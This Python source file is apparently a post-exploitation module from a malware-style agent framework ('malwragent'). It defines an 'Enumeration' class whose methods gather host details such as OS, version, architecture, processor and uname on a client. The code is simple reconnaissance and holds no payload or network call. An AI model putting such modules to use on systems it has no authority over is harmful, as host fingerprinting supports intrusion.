# -*- coding: utf-8 -*-
"""the enumeration module provides methods for platform enumeration and reconnaissance"""
from __future__ import absolute_import

import platform

from malwragent.packages.helpers.agentmodule import AgentModule
from malwragent.packages.helpers.agentmodule import Decorators

__class_name__ = 'Enumeration'
__client_mode__ = True
__server_mode__ = False
__module_type__ = 'Post'


class Enumeration(AgentModule):
    """provides host enumeration routines"""

    @Decorators.config(run_first=True)
    def f_get_platform(self):
        return platform.platform()

    @Decorators.config(run_first=True)
    def f_get_platform_version(self):
        return platform.version()

    @Decorators.config(run_first=True)
    def f_get_platform_machine(self):
        return platform.machine()

    @Decorators.config(run_first=True)
    def f_get_platform_system(self):
        return platform.system()

    @Decorators.config(run_first=True)
    def f_get_platform_processor(self):
        return platform.processor()

    @Decorators.args(None)  # Let this definition for testing purpose
    @Decorators.config(run_first=True)
    def f_get_platform_uname(self):
        return str(platform.uname())
